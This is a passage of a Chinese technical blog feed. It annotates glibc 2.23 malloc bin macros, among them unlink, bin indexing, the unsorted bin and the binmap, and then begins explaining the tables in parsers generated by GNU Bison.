c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br></pre></td></tr></table></figure><p>获取下一个 bin 的地址</p><h3 id="first-b-宏"><a href="#first-b-宏" class="headerlink" title="first(b) 宏"></a>first(b) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br></pre></td></tr></table></figure><p>获取 bin 中的 fd 指针</p><h3 id="last-b-宏"><a href="#last-b-宏" class="headerlink" title="last(b) 宏"></a>last(b) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>获取 bin 中的 bk 指针</p><h3 id="unlink-AV-P-BK-FD-宏（重点）（缺）"><a href="#unlink-AV-P-BK-FD-宏（重点）（缺）" class="headerlink" title="unlink(AV, P, BK, FD) 宏（重点）（缺）"></a>unlink(AV, P, BK, FD) 宏（重点）（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;                               \</span><br><span class="line">    BK = P-&gt;bk;                               \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))           \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;                            \</span><br><span class="line">        FD-&gt;bk = BK;                           \</span><br><span class="line">        BK-&gt;fd = FD;                           \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;<span class="built_in">size</span>)                  \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;          \</span><br><span class="line">       <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)       \</span><br><span class="line">      || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">         malloc_printerr (check_action,                  \</span><br><span class="line">                <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                P, AV);                   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                  \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;           \</span><br><span class="line">                <span class="keyword">else</span> &#123;                         \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;              \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;              \</span><br><span class="line">                  &#125;                            \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                         \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;           \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;           \</span><br><span class="line">              &#125;                               \</span><br><span class="line">          &#125;                               \</span><br><span class="line">      &#125;                                  \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3 - 4 行：<code>FD = P-&gt;fd</code> 和 <code>BK = P-&gt;bk</code> 是分别获取传入参数 P 的前驱节点和后继节点5</p><p>5 行：if 语句用于判断 P 的前驱节点的后继节点是否为 P，P的后继节点的前驱节点是否为 P，且要通过条件最后返回值为 0</p><p>6 行：如果第五行的返回值为 1，那么就调用 <code>malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV)</code></p><p>7 - 9 行：如果返回值是 0，进入 else 语句，并且让 <strong>P 的前驱节点的后继节点变成 P 的后继节点</strong></p><p>​                再让 <strong>P 的后继节点的前驱节点变成 P 的前驱节点</strong>，完成删除双向链表上的 P 节点的操作</p><p>10 - 11 行：</p><h2 id="Indexing"><a href="#Indexing" class="headerlink" title="Indexing"></a>Indexing</h2><h3 id="NBINS-宏"><a href="#NBINS-宏" class="headerlink" title="NBINS 宏"></a>NBINS 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Indexing</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced</span></span><br><span class="line"><span class="comment">    8 bytes apart. Larger bins are approximately logarithmically spaced:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    64 bins of size       8</span></span><br><span class="line"><span class="comment">    32 bins of size      64</span></span><br><span class="line"><span class="comment">    16 bins of size     512</span></span><br><span class="line"><span class="comment">     8 bins of size    4096</span></span><br><span class="line"><span class="comment">     4 bins of size   32768</span></span><br><span class="line"><span class="comment">     2 bins of size  262144</span></span><br><span class="line"><span class="comment">     1 bin  of size what's left</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    There is actually a little bit of slop in the numbers in bin_index</span></span><br><span class="line"><span class="comment">    for the sake of speed. This makes no difference elsewhere.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The bins top out around 1MB because we expect to service large</span></span><br><span class="line"><span class="comment">    requests via mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be</span></span><br><span class="line"><span class="comment">    a valid chunk size the small bins are bumped up one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br></pre></td></tr></table></figure><p>规定计算正常 bin 大小时的基准值</p><h3 id="NSMALLBINS-宏"><a href="#NSMALLBINS-宏" class="headerlink" title="NSMALLBINS 宏"></a>NSMALLBINS 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br></pre></td></tr></table></figure><p>规定计算正常 smallbin 大小时的基准值</p><h3 id="SMALLBIN-WIDTH-宏"><a href="#SMALLBIN-WIDTH-宏" class="headerlink" title="SMALLBIN_WIDTH 宏"></a>SMALLBIN_WIDTH 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br></pre></td></tr></table></figure><p>正常情况在 32 位下，这个值是 0x08；在 64 下这个值是 0x10</p><h3 id="SMALLBIN-CORRECTION-宏"><a href="#SMALLBIN-CORRECTION-宏" class="headerlink" title="SMALLBIN_CORRECTION 宏"></a>SMALLBIN_CORRECTION 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br></pre></td></tr></table></figure><p>这种就是在非正常情况下会有返回值 1，即在满足 <code>2 *SIZE_SZ &lt; __alignof__ (long double)</code> 时</p><h3 id="MIN-LARGE-SIZE-宏"><a href="#MIN-LARGE-SIZE-宏" class="headerlink" title="MIN_LARGE_SIZE 宏"></a>MIN_LARGE_SIZE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br></pre></td></tr></table></figure><p>用于规定 smallbin 的最大值(不等于)和 largebin 的最大值</p><p>正常情况下 64 位的最小值为 <code>(64 - 0) * 0x10 == 0x400</code>；32 位的最小值为 <code>(64 - 0) * 0x08 == 0x200</code></p><h3 id="in-smallbin-range-sz-宏"><a href="#in-smallbin-range-sz-宏" class="headerlink" title="in_smallbin_range(sz) 宏"></a>in_smallbin_range(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br></pre></td></tr></table></figure><p>如果一个 chunk 的 size 小于 MIN_LARGE_SIZE，那么该 chunk 就属于 smallbin</p><h3 id="smallbin-index-sz-宏"><a href="#smallbin-index-sz-宏" class="headerlink" title="smallbin_index(sz) 宏"></a>smallbin_index(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">   + SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure><p>SMALLBIN_CORRECTION 是用来兼容 <code>long double</code> 的</p><p>这个宏的主要意思就是在 64 位下，smallbin 中堆块的下标按照 <code>(unsigned) (sz)) &gt;&gt; 4</code> 来规划</p><p>在 32 位下，smallbin 中堆块的下标按照 <code>(unsigned) (sz)) &gt;&gt; 3</code> 来规划</p><p>且可以看出 <code>2 *SIZE_SZ &lt; __alignof__ (long double)</code> 的兼容操作只可能会在 32 位系统上出现</p><h3 id="largebin-index-32-sz-宏"><a href="#largebin-index-32-sz-宏" class="headerlink" title="largebin_index_32(sz) 宏"></a>largebin_index_32(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>) ?  <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure><p>参考 largebin_index_64(sz) 吧，这个是一般情况下 32 位的 largebin 分布</p><h3 id="largebin-index-32-big-sz-宏"><a href="#largebin-index-32-big-sz-宏" class="headerlink" title="largebin_index_32_big(sz) 宏"></a>largebin_index_32_big(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>) ?  <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure><p>参考 largebin_index_64(sz) 吧</p><p>这个是满足 <code>2 *SIZE_SZ &lt; __alignof__ (long double)</code> 下 32 位的 largebin 分布</p><h3 id="largebin-index-64-sz-宏"><a href="#largebin-index-64-sz-宏" class="headerlink" title="largebin_index_64(sz) 宏"></a>largebin_index_64(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure><p>可以看到大小为 <code>0x400</code> 的 chunk 对应的 index 为 <code>(0x400 &gt;&gt; 6) + 48</code> 即 64</p><p>而 index 为 64 对应的范围是 <code>[0x400, 0x400 + 1 &gt;&gt; 6)</code> 即 <code>[0x400, 0x440)</code></p><p>在这个级别的 index 中，size 的范围为 0x40（1&lt;&lt;6），依次类推 size 与 index 对应的关系是：</p><table><thead><tr><th align="center"></th><th align="center">size</th><th align="center">index</th></tr></thead><tbody><tr><td align="center">等差 0x40</td><td align="center">[0x400 , 0x440)</td><td align="center">64</td></tr><tr><td align="center"></td><td align="center">[0x440 , 0x480)</td><td align="center">65</td></tr><tr><td align="center"></td><td align="center">……</td><td align="center">……</td></tr><tr><td align="center"></td><td align="center">[0xC00 , 0xC40)</td><td align="center">96</td></tr><tr><td align="center"></td><td align="center">[0xC40 , 0xE00)</td><td align="center">97</td></tr><tr><td align="center">等差 0x200</td><td align="center">[0xE00 , 0x1000)</td><td align="center">98</td></tr><tr><td align="center"></td><td align="center">[0x1000 , 0x1200)</td><td align="center">99</td></tr><tr><td align="center"></td><td align="center">……</td><td align="center">……</td></tr><tr><td align="center"></td><td align="center">[0x2800 , 0x2A00)</td><td align="center">111</td></tr><tr><td align="center"></td><td align="center">[0x2A00 , 0x3000)</td><td align="center">112</td></tr><tr><td align="center">等差 0x1000</td><td align="center">[0x3000 , 0x4000)</td><td align="center">113</td></tr><tr><td align="center"></td><td align="center">[0x4000 , 0x5000)</td><td align="center">114</td></tr><tr><td align="center"></td><td align="center">……</td><td align="center">……</td></tr><tr><td align="center"></td><td align="center">[0x9000 , 0xA000)</td><td align="center">119</td></tr><tr><td align="center"></td><td align="center">[0xA000 , 0x10000)</td><td align="center">120</td></tr><tr><td align="center">等差 0x8000</td><td align="center">[0x10000 , 0x18000)</td><td align="center">121</td></tr><tr><td align="center"></td><td align="center">[0x18000 , 0x20000)</td><td align="center">122</td></tr><tr><td align="center"></td><td align="center">[0x20000 , 0x28000)</td><td align="center">123</td></tr><tr><td align="center">等差 0x18000</td><td align="center">[0x28000 , 0x40000)</td><td align="center">124</td></tr><tr><td align="center">等差 0x40000</td><td align="center">[0x40000 , 0x80000)</td><td align="center">125</td></tr><tr><td align="center"></td><td align="center">[0x80000 , …. )</td><td align="center">126</td></tr></tbody></table><h3 id="largebin-index-sz-宏"><a href="#largebin-index-sz-宏" class="headerlink" title="largebin_index(sz) 宏"></a>largebin_index(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz) \</span></span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">   : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">   : largebin_index_32 (sz))</span><br></pre></td></tr></table></figure><p>用来指定 largebin 应该以哪一种方式来指定当前堆块大小所对应的下标</p><h3 id="bin-index-sz-宏"><a href="#bin-index-sz-宏" class="headerlink" title="bin_index(sz) 宏"></a>bin_index(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_index(sz) \</span></span><br><span class="line">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span><br></pre></td></tr></table></figure><p>判断当前堆块的大小是满足 smallbin 还是满足 largebin，然后去对应的宏里得到该堆块大小所对应的下标</p><h2 id="Unsorted-chunks"><a href="#Unsorted-chunks" class="headerlink" title="Unsorted chunks"></a>Unsorted chunks</h2><h3 id="unsorted-chunks-M"><a href="#unsorted-chunks-M" class="headerlink" title="unsorted_chunks(M)"></a>unsorted_chunks(M)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the "unsorted" bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span></span><br></pre></td></tr></table></figure><h2 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h2><h3 id="initial-top-M-宏"><a href="#initial-top-M-宏" class="headerlink" title="initial_top(M) 宏"></a>initial_top(M) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment">    available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment">    any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment">    released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment">    M_TRIM_THRESHOLD).  Because top initially</span></span><br><span class="line"><span class="comment">    points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment">    extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment">    code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment">    need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment">    initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment">    interval between initialization and the first call to</span></span><br><span class="line"><span class="comment">    sysmalloc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment">    the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span></span><br></pre></td></tr></table></figure><h2 id="Binmap"><a href="#Binmap" class="headerlink" title="Binmap"></a>Binmap</h2><h3 id="BINMAPSHIFT-宏"><a href="#BINMAPSHIFT-宏" class="headerlink" title="BINMAPSHIFT 宏"></a>BINMAPSHIFT 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap' is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;源码来自:&lt;a href=&quot;https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://elixir.bootlin.c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Understanding C parsers generated by GNU Bison</title>
    <link href="https://billyotry.github.io/2020/07/11/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/"/>
    <id>https://billyotry.github.io/2020/07/11/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/</id>
    <published>2020-07-11T07:28:41.581Z</published>
    <updated>2020-07-11T07:34:01.950Z</updated>
    
    <content type="html"><![CDATA[<h3 id="table分析"><a href="#table分析" class="headerlink" title="table分析"></a>table分析</h3><p>bision与flex类似，有一系列的表，理清这些表之间的关系及索引方式后能更好的理解<code>yyparse</code>。</p><h4 id="yytranslate"><a href="#yytranslate" class="headerlink" title="yytranslate"></a>yytranslate</h4><p>此表映射了token和symbol token之间的关系。如果是预定义的<code>%token</code>，则会映射到其他的token序号中；如果是普通的终结符，则会把字符对应的ascii码映射到对应token中。</p><p>例如<code>S: &#39;\n&#39; ;</code>规则在生成后如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYTRANSLATE[YYLEX] -- Bison symbol number corresponding to YYLEX.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yytranslate[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">       <span class="number">3</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">...       </span><br><span class="line">       <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">1</span>,     <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>&#39;\n&#39;</code>的ascii为10,所以yytranslate[10]=3</p><p>多数映射的token为2，2是未定义，只有在语法中定义的符号才被赋予有效的符号编号。</p><p>这里的<code>&#39;\n&#39;</code>为什么是3，那是因为终结符的编号从3开始，可以通过查看输出解析器中生成的yytname数组来检查分配给各种符号的符号编号，而这里的例子符号编号如下所示。</p><table><thead><tr><th align="center"><em>Symbol</em></th><th align="center"><em>Number</em></th></tr></thead><tbody><tr><td align="center">$end</td><td align="center">0</td></tr><tr><td align="center">error</td><td align="center">1</td></tr><tr><td align="center">$undefined</td><td align="center">2</td></tr><tr><td align="center">\n</td><td align="center">3</td></tr></tbody></table><p>每当<code>yyparse()</code>需要token时，它都会调用<code>yylex</code>，然后获取对应token的symbol token内部码。</p><h4 id="yydefact"><a href="#yydefact" class="headerlink" title="yydefact"></a>yydefact</h4><p>此表存储了每个状态下对应的产生式规则的序号。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYDEFACT[STATE-NAME] -- Default rule to reduce with in state</span></span><br><span class="line"><span class="comment">   STATE-NUM when YYTABLE doesn't specify something else to do.  Zero</span></span><br><span class="line"><span class="comment">   means the default is an error.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yydefact[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">0</span>,     <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>在STATE-NAME状态下，通过yydefact[STATE-NAME]来获取其对应的产生式规则的序号。</p></blockquote><p>其中，<code>0</code>号表示error。由于默认<code>($accept → L $end)</code>rule(其rule number为1)的存在，我们定义的所有rule索引都会增加1。即我们定义的第一个rule <code>S: &#39;\n&#39; ;</code>, 其rule number在此处为2。</p><h4 id="yydefgoto"><a href="#yydefgoto" class="headerlink" title="yydefgoto"></a>yydefgoto</h4><p>yydefgoto是GOTO跳转表的压缩形式。它的元素数量为语法中非终结符的数量，元素的值表示每个非终结符要跳转的状态。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* yydefgoto[nth non-terminal] = most common GOTO state for the nth non-terminal. */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yydefgoto[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-1</span>,     <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>索引方式为<code>yytranslate</code>表中的符号编号减去非终结符的数目。</p><p>parser在用rule归约栈上内容的时候会查询yydefgoto，但在某些状态下会使用yytable表。</p><p>第一个非终结符<code>$accept</code>的rule为-1(即yydefgoto[0]),<code>$accept</code>不会被归约。</p><h4 id="yyr1-and-yyr2"><a href="#yyr1-and-yyr2" class="headerlink" title="yyr1 and yyr2"></a>yyr1 and yyr2</h4><p>yyr1表示每个rule左部的symbol数量，通过yyr1，当进行归约时，我们需要知道用于还原以转换为适当状态的规则的LHS符号，这就是该表使用的地方。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYR1[YYN] -- Symbol number of symbol that rule YYN derives.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yyr1[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">4</span>,     <span class="number">5</span></span><br><span 